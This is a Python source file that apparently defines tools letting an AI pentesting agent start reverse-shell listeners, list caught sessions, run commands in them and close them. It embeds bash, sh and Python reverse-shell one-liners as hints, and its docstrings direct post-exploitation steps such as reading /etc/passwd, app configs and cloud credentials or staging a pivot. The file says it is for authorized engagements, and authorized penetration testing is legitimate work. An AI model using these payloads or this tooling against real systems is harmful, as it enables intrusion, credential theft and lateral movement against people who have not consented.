"""MCP tools for reverse-shell listeners and interactive sessions.

Demonstrate RCE impact: catch the shell an RCE-class bug yields and drive it
(``id``, ``whoami``, read a secret) so a finding shows real impact, not just
"RCE confirmed". Authorized engagements only — the operator owns scope.
"""

from __future__ import annotations

import asyncio
import json

from agents import RunContextWrapper, function_tool

from strix.tools.shell_session import manager


# Standard reverse-shell one-liners (LHOST/PORT filled by the operator). These
# are cheat-sheet payloads; delivery happens through a confirmed RCE the agent
# already found, against an authorized target.
_REVSHELL_HINTS = [
    "bash -i >& /dev/tcp/<LHOST>/<PORT> 0>&1",
    "sh -i >& /dev/tcp/<LHOST>/<PORT> 0>&1",
    'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<PORT>));'
    '[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")\'',
]


@function_tool(timeout=15)
async def start_listener(ctx: RunContextWrapper, port: int, bind_host: str = "0.0.0.0") -> str:
    """Start a reverse-shell listener on ``port`` on the Strix box.

    Bind a listener, then deliver a reverse-shell payload through a confirmed
    RCE (SSTI, deserialization, command injection, LFI+log-poison, SSRF-to-
    internal, etc.) pointing back at ``<LHOST>:<port>``. When the target
    connects, a session appears in ``list_shells``. Authorized targets only.

    Returns JSON with the bound ``port`` and reverse-shell one-liner ``hints``
    (fill in your reachable ``<LHOST>``).

    Args:
        port: TCP port to listen on (needs privileges for <1024).
        bind_host: Interface to bind (default all interfaces).
    """
    del ctx
    result = await asyncio.to_thread(manager.start_listener, port, bind_host)
    if result.get("success"):
        result["hints"] = [h.replace("<PORT>", str(port)) for h in _REVSHELL_HINTS]
    return json.dumps(result, ensure_ascii=False, default=str)


@function_tool(timeout=15)
async def list_shells(ctx: RunContextWrapper) -> str:
    """List caught reverse-shell sessions (id, remote address, liveness, pending output).

    Returns JSON with ``sessions``. Use a ``session_id`` with ``shell_exec`` /
    ``read_shell`` / ``close_shell``.
    """
    del ctx
    sessions = await asyncio.to_thread(manager.list_shells)
    return json.dumps({"success": True, "sessions": sessions}, ensure_ascii=False, default=str)


@function_tool(timeout=60)
async def shell_exec(
    ctx: RunContextWrapper, session_id: str, command: str, read_timeout: float = 3.0
) -> str:
    """Run a command in a caught shell and return its output — write + read in one call.

    The workhorse for post-exploitation: prove impact with ``id`` / ``whoami`` /
    ``hostname``, read a secret (``cat /etc/passwd``, app config, cloud creds),
    or stage a pivot. Output is collected until the shell goes idle or
    ``read_timeout`` elapses. Line-oriented shells only (no vim/top).

    Returns JSON with ``output``.

    Args:
        session_id: A session id from ``list_shells``.
        command: Shell command to run.
        read_timeout: Max seconds to wait for output (default 3).
    """
    del ctx
    result = await asyncio.to_thread(manager.shell_exec, session_id, command, read_timeout)
    return json.dumps(result, ensure_ascii=False, default=str)


@function_tool(timeout=60)
async def read_shell(ctx: RunContextWrapper, session_id: str, timeout: float = 2.0) -> str:
    """Drain buffered output from a shell without sending a command.

    For output that arrives asynchronously (a long-running command, a shell
    banner right after connect). Use ``shell_exec`` to run a command.

    Returns JSON with ``output``.

    Args:
        session_id: A session id from ``list_shells``.
        timeout: Max seconds to wait for output to appear (default 2).
    """
    del ctx
    result = await asyncio.to_thread(manager.read_shell, session_id, timeout)
    return json.dumps(result, ensure_ascii=False, default=str)


@function_tool(timeout=15)
async def close_shell(
    ctx: RunContextWrapper, session_id: str | None = None, port: int | None = None
) -> str:
    """Close a shell session (``session_id``) or a whole listener + its sessions (``port``).

    Returns JSON confirming what was closed.

    Args:
        session_id: Close this session.
        port: Close the listener on this port and every session it caught.
    """
    del ctx
    result = await asyncio.to_thread(manager.close_shell, session_id, port)
    return json.dumps(result, ensure_ascii=False, default=str)
